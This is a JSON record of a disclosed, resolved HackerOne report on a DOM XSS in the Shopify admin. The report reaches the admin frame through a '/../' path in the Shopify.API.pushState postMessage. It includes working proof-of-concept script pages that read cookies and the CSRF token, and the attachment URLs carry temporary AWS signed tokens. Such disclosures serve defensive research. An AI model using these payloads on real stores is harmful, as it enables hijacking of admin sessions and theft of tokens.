@@ -1,0 +1,223 @@
+{
+  "id": 662083,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82NjIwODM=",
+  "url": "https://hackerone.com/reports/662083",
+  "title": "Inject page in admin panel via Shopify.API.pushState",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "low",
+  "readable_substate": "Resolved",
+  "created_at": "2019-07-27T23:17:32.559Z",
+  "submitted_at": "2019-07-27T23:17:32.559Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "tiago-danin",
+    "url": "/tiago-danin",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/pyoakrysfo3dmzrfgm4dvllk56on/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 1382,
+    "url": "https://hackerone.com/shopify",
+    "handle": "shopify",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/1d3351b56b27c9bb56ce22821a57514a7210186a77aefb760cd2113272723c1f"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Shopify",
+      "twitter_handle": "",
+      "website": "https://www.shopify.com",
+      "about": "Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2019-09-09T16:40:43.129Z",
+  "bug_reporter_agreed_on_going_public_at": "2019-09-07T16:32:05.816Z",
+  "team_member_agreed_on_going_public_at": "2019-09-09T16:40:43.031Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "# Summary\n`Shopify.API.pushState` call the method `handleRoutePushEvent`, allows you to change routes to open pages from admin panel:\n```js\nhandleRoutePushEvent({pathname: e, search: t, state: a, hash: o}) {\n                const {adminPath: n, history: i} = this.props // `adminPath` = `/admin`\n                  , s = \"\".concat(n).concat(e);\n                // *** //\n}\n```\nIf we use the prefix `..` in `pathname` It will removes `admin` (`/admin/../pages/xss` ~> `/pages/xss`). You can load pages from outside the admin panel. The `document.getElementById(\"AppFrameMain\")` will be modified with an insecure page.\n\n## Step to Reproduce\n1. Create an page with the XSS (title: xss, path: /pages/xss):\n{F540958}\n```html\n<script>\nalert(\"XSS By Tiago\")\nconsole.log(\"Document:\", document)\nconsole.log(\"Window:\", window)\nconsole.log(\"Cookies:\", document.cookie)\nconsole.log(\"Location:\", window.location)\nconsole.log(\"CSRF Token:\", document.querySelectorAll('[data-serialized-id=\"csrf\"]')[0].innerText)\n</script>\n```\n\n2. Create another page with our triggered XSS (title: xss play, path: /pages/xss-play):\n{F540963}\n```html\n<script>\n    function attack(){\n        const ctx = window.open(location.origin+'/admin/themes', '_blank')\n        const data = JSON.stringify({\n            message: 'Shopify.API.pushState',\n            data: {pathname: \"/../pages/xss\"}\n        });\n\n        let interval;\n        interval = setInterval(function(){\n            if (window.attackSuccess) {\n                clearInterval(interval)\n            } else {\n                ctx.postMessage(data)\n            }\n        }, 500)\n    }\n    attack()\n</script>\n<a href=\"javascript:attack()\" style=\"display:block;text-align:center;width:100%;height:300px;line-height:300px;background:#000;color:#fff;\">click me start attack</a>\n```\n\n3. Open the page https://[YOU_STORE].myshopify.com/pages/xss-play\n4. Admin panel has been opened and script executed:\n{F540964}\n\nTested with Google Chrome - Version 76.0.3788.1 (Official Build) dev (64-bit)\n\n## Impact\n\nAbuse the active admin session to extract data as:\n- CSRF token.\n- Store config.",
+  "bounty_amount": "500.0",
+  "formatted_bounty": "$500",
+  "weakness": {
+    "id": 63,
+    "name": "Cross-site Scripting (XSS) - DOM"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 540958,
+      "file_name": "DeepinScreenshot_google-chrome-unstable_20190727194202.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/540/958/39f57bf41ceb4972518ee4cee5b30cf075864b5e/DeepinScreenshot_google-chrome-unstable_20190727194202.png?response-content-disposition=attachment%3B%20filename%3D%22DeepinScreenshot_google-chrome-unstable_20190727194202.png%22%3B%20filename%2A%3DUTF-8%27%27DeepinScreenshot_google-chrome-unstable_20190727194202.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ36YTT7EK%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T052813Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIA1ZNsmlZoOH2sNCCJQm8vgVkCxReNlkWY3JXmMZQS1PAiEAhwOMUmzU%2FA7AIWh%2BcoCRhavPvDsaOoGHsEJl9bJiaowqsgUIfhADGgwwMTM2MTkyNzQ4NDkiDL8E7WhoaQfL7YwihSqPBRtniWJt8KCZzq8oHzDTRoNU%2BfuiqNhk46Ud0IsVuqvdJszSyslKVt%2FBZT7I4bIGssjXeotxsJBfkmYNXpC0%2B826fHIxpSFeXii3aI2QIOkXfkk7gAq2g4SYj9uaB5pOH66BCqPwpQcWKB8QsMsFJFrRwPciX5Z1AxS1bhktmgZARwZ2I3CV1ev2f0s8dVOVNXKRdkCilC0INM5y%2FrswG8%2BVEy0KiQDEJ21ecsYpDgdXK8FfSBgh1%2Bn5RMvnDLDPrfeHwECRuFEy5vurKx8tGYw9bwZ1r3NdfGM4X6byVZg3HUB7ZPc8DBTDoTKCjqHWzV%2BNFJlpbXqB7xmJj2BxrOdLnW21cks%2B4%2FiPrjXWnYGcn0Fr6n0OE5Jj3NNEyOUTm4qEt9aNq7V7X%2FKrGUgLc51I8yajZBeCfa2wfsFA1nWWEy08v1%2BBq5k43NlmA6nW2FzmR%2BSo2VDEp5QmVSMEjTrt5Qnum5HwTpByOnh4ojw51QnPryfK0uVHzPZB%2FiyhOnxu64KmdRxm5WoupcyGumAJ%2BBnOCQAKVQCHp2RgxvZ%2ByVyCuy5uerCB3lOp1Ah%2BnhW7rqRcRasVhwl%2FWgsvIDVwpIOlaCwCVKeWvxZ8DmJ8WeAyrYljAbcG%2B6OlqvCn%2Bsy2GcIXqQcbZz7HMTO8m6cfZUP%2FhU3ISNDkm%2BHGyhjFy5BAtFrNPWqMjgI8xz8VLJfc6W2wEf5BLzsKmDvImTP%2F6iuriYp2ut9I%2FfbYCPclnWdsng1uSwKTSxpPFu7R12hCz%2BkOadA1A5b3lKhQH6N3QFi6djPwkrF3UB8cJp3GwfPkgrnE2PtZNBbuoH4viiwznHeSiC06miC6ttOTU54mtduUWP3%2F9bmBfIjoRGow56630gY6sQEE1o7UZkuqUoVbDjJybTvCYrvAqcPOxc0WubmC5BUVBsNcqm3oOrZCs1dDsVsHSLFuwAvsi%2BukYcwv5OPivuTzIDIu2Fwk%2FFqCgFWH%2BtwTvC7LGV9vSG0%2F14g4I4MXtKOcbmi1AfG2eb9SmSkZ0MRu%2FOr7kg6ZWodJDMIkoElhInOIZeFwdL%2Bsb6PMEjbvVp9uA9Oqyqp3Ou8KT%2BAw%2BKlMkntGyQxYpcD0erJY4zrVh3A%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=7f0f249f9b930b900071a796dd5068bd7b9100d0d71402099fcd0d0f737625be",
+      "file_size": 184214,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 540963,
+      "file_name": "DeepinScreenshot_google-chrome-unstable_20190727194507.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/540/963/80fb21169308d18b76b7d412cd643d580d84e53b/DeepinScreenshot_google-chrome-unstable_20190727194507.png?response-content-disposition=attachment%3B%20filename%3D%22DeepinScreenshot_google-chrome-unstable_20190727194507.png%22%3B%20filename%2A%3DUTF-8%27%27DeepinScreenshot_google-chrome-unstable_20190727194507.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ36YTT7EK%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T052813Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIA1ZNsmlZoOH2sNCCJQm8vgVkCxReNlkWY3JXmMZQS1PAiEAhwOMUmzU%2FA7AIWh%2BcoCRhavPvDsaOoGHsEJl9bJiaowqsgUIfhADGgwwMTM2MTkyNzQ4NDkiDL8E7WhoaQfL7YwihSqPBRtniWJt8KCZzq8oHzDTRoNU%2BfuiqNhk46Ud0IsVuqvdJszSyslKVt%2FBZT7I4bIGssjXeotxsJBfkmYNXpC0%2B826fHIxpSFeXii3aI2QIOkXfkk7gAq2g4SYj9uaB5pOH66BCqPwpQcWKB8QsMsFJFrRwPciX5Z1AxS1bhktmgZARwZ2I3CV1ev2f0s8dVOVNXKRdkCilC0INM5y%2FrswG8%2BVEy0KiQDEJ21ecsYpDgdXK8FfSBgh1%2Bn5RMvnDLDPrfeHwECRuFEy5vurKx8tGYw9bwZ1r3NdfGM4X6byVZg3HUB7ZPc8DBTDoTKCjqHWzV%2BNFJlpbXqB7xmJj2BxrOdLnW21cks%2B4%2FiPrjXWnYGcn0Fr6n0OE5Jj3NNEyOUTm4qEt9aNq7V7X%2FKrGUgLc51I8yajZBeCfa2wfsFA1nWWEy08v1%2BBq5k43NlmA6nW2FzmR%2BSo2VDEp5QmVSMEjTrt5Qnum5HwTpByOnh4ojw51QnPryfK0uVHzPZB%2FiyhOnxu64KmdRxm5WoupcyGumAJ%2BBnOCQAKVQCHp2RgxvZ%2ByVyCuy5uerCB3lOp1Ah%2BnhW7rqRcRasVhwl%2FWgsvIDVwpIOlaCwCVKeWvxZ8DmJ8WeAyrYljAbcG%2B6OlqvCn%2Bsy2GcIXqQcbZz7HMTO8m6cfZUP%2FhU3ISNDkm%2BHGyhjFy5BAtFrNPWqMjgI8xz8VLJfc6W2wEf5BLzsKmDvImTP%2F6iuriYp2ut9I%2FfbYCPclnWdsng1uSwKTSxpPFu7R12hCz%2BkOadA1A5b3lKhQH6N3QFi6djPwkrF3UB8cJp3GwfPkgrnE2PtZNBbuoH4viiwznHeSiC06miC6ttOTU54mtduUWP3%2F9bmBfIjoRGow56630gY6sQEE1o7UZkuqUoVbDjJybTvCYrvAqcPOxc0WubmC5BUVBsNcqm3oOrZCs1dDsVsHSLFuwAvsi%2BukYcwv5OPivuTzIDIu2Fwk%2FFqCgFWH%2BtwTvC7LGV9vSG0%2F14g4I4MXtKOcbmi1AfG2eb9SmSkZ0MRu%2FOr7kg6ZWodJDMIkoElhInOIZeFwdL%2Bsb6PMEjbvVp9uA9Oqyqp3Ou8KT%2BAw%2BKlMkntGyQxYpcD0erJY4zrVh3A%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=25ddec7dfa5534b0060c448b84990bf27647ac43dfafd2ce53d2aeb555f24ab2",
+      "file_size": 182260,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 540964,
+      "file_name": "DeepinScreenshot_google-chrome-unstable_20190727195220.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/540/964/fe915425de301682da665d4f0941716734160365/DeepinScreenshot_google-chrome-unstable_20190727195220.png?response-content-disposition=attachment%3B%20filename%3D%22DeepinScreenshot_google-chrome-unstable_20190727195220.png%22%3B%20filename%2A%3DUTF-8%27%27DeepinScreenshot_google-chrome-unstable_20190727195220.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ36YTT7EK%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T052813Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIA1ZNsmlZoOH2sNCCJQm8vgVkCxReNlkWY3JXmMZQS1PAiEAhwOMUmzU%2FA7AIWh%2BcoCRhavPvDsaOoGHsEJl9bJiaowqsgUIfhADGgwwMTM2MTkyNzQ4NDkiDL8E7WhoaQfL7YwihSqPBRtniWJt8KCZzq8oHzDTRoNU%2BfuiqNhk46Ud0IsVuqvdJszSyslKVt%2FBZT7I4bIGssjXeotxsJBfkmYNXpC0%2B826fHIxpSFeXii3aI2QIOkXfkk7gAq2g4SYj9uaB5pOH66BCqPwpQcWKB8QsMsFJFrRwPciX5Z1AxS1bhktmgZARwZ2I3CV1ev2f0s8dVOVNXKRdkCilC0INM5y%2FrswG8%2BVEy0KiQDEJ21ecsYpDgdXK8FfSBgh1%2Bn5RMvnDLDPrfeHwECRuFEy5vurKx8tGYw9bwZ1r3NdfGM4X6byVZg3HUB7ZPc8DBTDoTKCjqHWzV%2BNFJlpbXqB7xmJj2BxrOdLnW21cks%2B4%2FiPrjXWnYGcn0Fr6n0OE5Jj3NNEyOUTm4qEt9aNq7V7X%2FKrGUgLc51I8yajZBeCfa2wfsFA1nWWEy08v1%2BBq5k43NlmA6nW2FzmR%2BSo2VDEp5QmVSMEjTrt5Qnum5HwTpByOnh4ojw51QnPryfK0uVHzPZB%2FiyhOnxu64KmdRxm5WoupcyGumAJ%2BBnOCQAKVQCHp2RgxvZ%2ByVyCuy5uerCB3lOp1Ah%2BnhW7rqRcRasVhwl%2FWgsvIDVwpIOlaCwCVKeWvxZ8DmJ8WeAyrYljAbcG%2B6OlqvCn%2Bsy2GcIXqQcbZz7HMTO8m6cfZUP%2FhU3ISNDkm%2BHGyhjFy5BAtFrNPWqMjgI8xz8VLJfc6W2wEf5BLzsKmDvImTP%2F6iuriYp2ut9I%2FfbYCPclnWdsng1uSwKTSxpPFu7R12hCz%2BkOadA1A5b3lKhQH6N3QFi6djPwkrF3UB8cJp3GwfPkgrnE2PtZNBbuoH4viiwznHeSiC06miC6ttOTU54mtduUWP3%2F9bmBfIjoRGow56630gY6sQEE1o7UZkuqUoVbDjJybTvCYrvAqcPOxc0WubmC5BUVBsNcqm3oOrZCs1dDsVsHSLFuwAvsi%2BukYcwv5OPivuTzIDIu2Fwk%2FFqCgFWH%2BtwTvC7LGV9vSG0%2F14g4I4MXtKOcbmi1AfG2eb9SmSkZ0MRu%2FOr7kg6ZWodJDMIkoElhInOIZeFwdL%2Bsb6PMEjbvVp9uA9Oqyqp3Ou8KT%2BAw%2BKlMkntGyQxYpcD0erJY4zrVh3A%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=6fafc6694813138744992dfcf2dcc22ff326e7ea125371a1ba6722cd8f6eaa1d",
+      "file_size": 278012,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 51,
+  "voters": [
+    "drsniper",
+    "yxw21",
+    "ali",
+    "sameerphad72",
+    "w2w",
+    "hundredpercent",
+    "pr0f0x01",
+    "lp1dev",
+    "i5nipe",
+    "codeanddecode",
+    "and 41 more..."
+  ],
+  "severity": {
+    "rating": "low",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 413,
+    "asset_type": "URL",
+    "asset_identifier": "your-store.myshopify.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "662083",
+  "votes": 51,
+  "latest_disclosable_activity_at": "2019-09-09T16:40:43.165Z",
+  "_metadata": {
+    "saved_at": "2026-07-08T13:28:13.711722",
+    "source": "https://hackerone.com/reports/662083.json",
+    "report_id": 662083
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82NjIwODM=",
+    "databaseId": "662083",
+    "title": "Inject page in admin panel via Shopify.API.pushState",
+    "url": "https://hackerone.com/reports/662083",
+    "state": null,
+    "substate": "resolved",
+    "disclosed_at": "2019-09-09T16:40:43.129Z",
+    "created_at": "2019-07-27T23:17:32.559Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzYz",
+      "name": "Cross-site Scripting (XSS) - DOM",
+      "external_id": "cwe-79"
+    },
+    "severity": {
+      "rating": "low",
+      "score": null
+    },
+    "reporter": {
+      "username": "tiago-danin"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzEzODI=",
+      "handle": "shopify",
+      "name": "Shopify",
+      "url": "https://hackerone.com/shopify",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": [
+        {
+          "node": {
+            "id": "Z2lkOi8vaGFja2Vyb25lL0JvdW50eS8xNTAwNTY=",
+            "amount": "500.00",
+            "awarded_amount": "500.00",
+            "awarded_bonus_amount": "0.00",
+            "created_at": "2019-08-01T13:52:52.737Z"
+          }
+        }
+      ]
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzY2MjA4Mw==",
+    "_id": "662083",
+    "disclosed": true,
+    "votes": 51,
+    "latest_disclosable_activity_at": "2019-09-09T16:40:43.165Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82NjIwODM=",
+      "databaseId": "662083",
+      "title": "Inject page in admin panel via Shopify.API.pushState",
+      "url": "https://hackerone.com/reports/662083",
+      "disclosed_at": "2019-09-09T16:40:43.129Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzEzODI=",
+      "handle": "shopify",
+      "name": "Shopify",
+      "url": "https://hackerone.com/shopify",
+      "currency": "usd"
+    }
+  }
+}
